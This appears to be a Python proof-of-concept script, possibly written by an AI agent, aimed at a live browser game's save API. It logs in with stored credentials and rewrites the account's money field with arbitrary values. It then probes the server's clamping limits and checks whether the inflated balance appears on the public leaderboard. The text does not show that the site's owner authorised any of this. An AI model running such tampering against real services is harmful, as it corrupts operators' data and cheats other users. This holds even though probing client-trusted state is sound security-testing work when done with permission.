#!/usr/bin/env python3
"""
Lagos Life - DECISIVE TEST, clean run.

Earlier every PUT 409'd because my own open browser session kept autosaving,
so the `base` I read was stale before my PUT landed - a race with myself.
The live client is now stopped (page navigated to about:blank), so this is a
clean atomic GET -> mutate -> PUT.

The captured real request confirms the correct shape:
  PUT /api/save  {"game": {...}, "base": <updatedAt>}   -> 200 {"ok":true,...}
"""
import json, urllib.request, urllib.error, http.cookiejar, copy, time

BASE = "https://lagoslife.eliysites.com"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/125.0 Safari/537.36")
creds = json.load(open("/tmp/ll_probe_creds.json"))

jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def api(p, m="GET", b=None):
    h = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE, "Referer": BASE + "/"}
    d = None
    if b is not None:
        d = json.dumps(b).encode(); h["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + p, method=m, data=d, headers=h)
    try:
        with op.open(r, timeout=40) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read() or b"{}")
        except Exception:
            return e.code, {}
    except Exception as e:
        return None, {"err": str(e)}


api("/api/auth/login", "POST", {"username": creds["username"], "password": creds["password"]})


def test(value, label):
    st, save = api("/api/save")
    game = copy.deepcopy(save["game"]); base_at = save["updatedAt"]
    before = game.get("money"); game["money"] = value
    body = {"game": {**game, "outbox": {"notices": [], "fx": []}}, "base": base_at}
    t0 = time.time()
    st2, resp = api("/api/save", "PUT", body)
    dt = (time.time() - t0) * 1000
    st3, after = api("/api/save")
    got = (after.get("game") or {}).get("money")
    print(f"  {label}")
    print(f"    base={base_at}  PUT money={value:,} -> HTTP {st2} ({dt:.0f}ms)  resp={json.dumps(resp)[:90]}")
    print(f"    server money before={before:,}  after={got if got is None else format(got, ',')}")
    return got


print("=" * 92)
print("TEST 1 - arbitrary client-authored balance")
print("=" * 92)
NEW = 123_456_789
got1 = test(NEW, "tamper: set money to a value no fresh account could earn")
ok1 = (got1 == NEW)
print(f"\n  *** {'CONFIRMED' if ok1 else 'NOT CONFIRMED'}: server "
      f"{'PERSISTED' if ok1 else 'did not persist'} a client-authored balance ***")

print("\n" + "=" * 92)
print("TEST 2 - ceiling / clamp behaviour")
print("=" * 92)
for v in (5_000_000_000, 5_000_000_001, 9_999_999_999, 10**15):
    got = test(v, f"probe {v:,}")
    print(f"      -> persisted {got if got is None else format(got, ',')}"
          f"{'  (CLAMPED)' if got not in (None, v) else ''}")

print("\n" + "=" * 92)
print("TEST 3 - does the inflated net worth publish to the PUBLIC leaderboard?")
print("=" * 92)
got = test(4_999_998_777, "leaderboard tamper")
st, fb = api("/api/forbes")
print(f"\n  save money now = {got if got is None else format(got, ',')}")
print(f"  GET /api/forbes -> {st}  total={ (fb or {}).get('total') }")
print(f"  mine = {json.dumps((fb or {}).get('mine'))}")
top = (fb or {}).get("top") or []
print(f"  in public top-3? {json.dumps([e for e in top[:3] if e.get('username') == creds['username']])}")
json.dump(fb, open("/tmp/ll_forbes_final.json", "w"), indent=2)

print("\n" + "=" * 92)
print(f"probe account: @{creds['username']}")
print("=" * 92)
